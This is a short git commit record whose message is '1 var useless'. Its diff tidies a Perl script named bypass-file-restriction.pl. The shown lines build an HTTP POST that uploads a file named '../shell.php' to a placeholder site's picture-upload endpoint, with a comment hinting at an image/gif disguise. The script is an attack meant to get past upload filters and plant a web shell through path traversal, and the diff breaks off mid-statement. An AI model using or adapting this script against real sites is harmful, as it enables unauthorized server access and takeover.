f148c4c48f66ae35e1cb71d0b0fc2aa30ef634ca
Bxsic <65828028+bxsic-fr@users.noreply.github.com>
2021-03-22 13:48:32 +0100

    1 var useless

--- bypass-file-restriction.pl
+++ bypass-file-restriction.pl
@@ -1,7 +1,8 @@
 #!/usr/bin/perl
 use HTTP::Request::Common;
 use LWP;
-$bx = $bx = LWP::UserAgent->new;
+
+$bx = LWP::UserAgent->new;
 $result = $bx->request(POST 'http://site.com/?picture=upload', 
 Content_Type => 'form-data', #image/gif
 Content => [userfile => ["../shell.php"], 
